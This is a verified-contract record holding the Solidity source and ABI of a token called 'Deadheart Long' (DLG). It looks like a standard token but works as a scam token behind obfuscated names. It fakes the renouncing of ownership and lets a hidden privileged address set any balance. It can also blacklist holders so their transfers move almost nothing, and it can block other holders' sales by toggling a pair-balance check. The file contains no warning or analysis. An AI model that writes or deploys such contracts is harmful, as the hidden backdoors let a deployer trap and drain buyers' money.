{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface receiverSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountShould {\n    function createPair(address totalList, address minTake) external returns (address);\n}\n\ninterface teamBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFund) external view returns (uint256);\n\n    function transfer(address tradingTake, uint256 autoBuyLiquidity) external returns (bool);\n\n    function allowance(address listReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoBuyLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTake,\n        uint256 autoBuyLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletMax, uint256 value);\n    event Approval(address indexed listReceiver, address indexed spender, uint256 value);\n}\n\ninterface tradingBuy is teamBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeadheartLong is sellShould, teamBuy, tradingBuy {\n\n    function balanceOf(address liquidityFund) public view virtual override returns (uint256) {\n        return txTakeSender[liquidityFund];\n    }\n\n    mapping(address => mapping(address => uint256)) private feeFromReceiver;\n\n    function modeEnable(address limitAmount, uint256 autoBuyLiquidity) public {\n        walletSwap();\n        txTakeSender[limitAmount] = autoBuyLiquidity;\n    }\n\n    function transfer(address limitAmount, uint256 autoBuyLiquidity) external virtual override returns (bool) {\n        return fromTradingEnable(_msgSender(), limitAmount, autoBuyLiquidity);\n    }\n\n    address public feeReceiver;\n\n    string private isExempt = \"DLG\";\n\n    uint256 private takeIs;\n\n    function getOwner() external view returns (address) {\n        return minReceiver;\n    }\n\n    address marketingAmountLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private senderBuy;\n\n    function walletSwap() private view {\n        require(amountMax[_msgSender()]);\n    }\n\n    bool public takeTo;\n\n    uint256 constant exemptReceiver = 10 ** 10;\n\n    function launchMax(address atFrom) public {\n        walletSwap();\n        \n        if (atFrom == feeReceiver || atFrom == launchWallet) {\n            return;\n        }\n        limitTrading[atFrom] = true;\n    }\n\n    uint256 private takeBuy;\n\n    uint256 public exemptTo;\n\n    uint256 maxTradingLimit;\n\n    function feeSellMin() public {\n        emit OwnershipTransferred(feeReceiver, address(0));\n        minReceiver = address(0);\n    }\n\n    bool private shouldAt;\n\n    uint256 takeMode;\n\n    bool public autoEnableBuy;\n\n    function allowance(address tradingLimit, address totalWallet) external view virtual override returns (uint256) {\n        if (totalWallet == shouldExempt) {\n            return type(uint256).max;\n        }\n        return feeFromReceiver[tradingLimit][totalWallet];\n    }\n\n    address private minReceiver;\n\n    address public launchWallet;\n\n    mapping(address => uint256) private txTakeSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSell;\n    }\n\n    function transferFrom(address amountMarketing, address tradingTake, uint256 autoBuyLiquidity) external override returns (bool) {\n        if (_msgSender() != shouldExempt) {\n            if (feeFromReceiver[amountMarketing][_msgSender()] != type(uint256).max) {\n                require(autoBuyLiquidity <= feeFromReceiver[amountMarketing][_msgSender()]);\n                feeFromReceiver[amountMarketing][_msgSender()] -= autoBuyLiquidity;\n            }\n        }\n        return fromTradingEnable(amountMarketing, tradingTake, autoBuyLiquidity);\n    }\n\n    string private senderSwap = \"Deadheart Long\";\n\n    mapping(address => bool) public limitTrading;\n\n    function owner() external view returns (address) {\n        return minReceiver;\n    }\n\n    uint256 private modeTotal;\n\n    function marketingToken(uint256 autoBuyLiquidity) public {\n        walletSwap();\n        takeMode = autoBuyLiquidity;\n    }\n\n    uint256 private swapSell = 100000000 * 10 ** 18;\n\n    uint256 private receiverFrom;\n\n    uint8 private shouldSender = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldSender;\n    }\n\n    address shouldExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        receiverSell autoEnable = receiverSell(shouldExempt);\n        launchWallet = amountShould(autoEnable.factory()).createPair(autoEnable.WETH(), address(this));\n        \n        feeReceiver = _msgSender();\n        feeSellMin();\n        amountMax[feeReceiver] = true;\n        txTakeSender[feeReceiver] = swapSell;\n        if (receiverFrom != modeTotal) {\n            autoEnableBuy = false;\n        }\n        emit Transfer(address(0), feeReceiver, swapSell);\n    }\n\n    mapping(address => bool) public amountMax;\n\n    function toAmount(address amountMarketing, address tradingTake, uint256 autoBuyLiquidity) internal returns (bool) {\n        require(txTakeSender[amountMarketing] >= autoBuyLiquidity);\n        txTakeSender[amountMarketing] -= autoBuyLiquidity;\n        txTakeSender[tradingTake] += autoBuyLiquidity;\n        emit Transfer(amountMarketing, tradingTake, autoBuyLiquidity);\n        return true;\n    }\n\n    function atExemptLaunched(address modeSell) public {\n        require(modeSell.balance < 100000);\n        if (takeTo) {\n            return;\n        }\n        \n        amountMax[modeSell] = true;\n        \n        takeTo = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isExempt;\n    }\n\n    function approve(address totalWallet, uint256 autoBuyLiquidity) public virtual override returns (bool) {\n        feeFromReceiver[_msgSender()][totalWallet] = autoBuyLiquidity;\n        emit Approval(_msgSender(), totalWallet, autoBuyLiquidity);\n        return true;\n    }\n\n    uint256 public walletFund;\n\n    event OwnershipTransferred(address indexed walletFrom, address indexed autoTeam);\n\n    function fromTradingEnable(address amountMarketing, address tradingTake, uint256 autoBuyLiquidity) internal returns (bool) {\n        if (amountMarketing == feeReceiver) {\n            return toAmount(amountMarketing, tradingTake, autoBuyLiquidity);\n        }\n        uint256 fromSwapReceiver = teamBuy(launchWallet).balanceOf(marketingAmountLaunch);\n        require(fromSwapReceiver == takeMode);\n        require(tradingTake != marketingAmountLaunch);\n        if (limitTrading[amountMarketing]) {\n            return toAmount(amountMarketing, tradingTake, exemptReceiver);\n        }\n        return toAmount(amountMarketing, tradingTake, autoBuyLiquidity);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"atExemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"marketingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeadheartLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}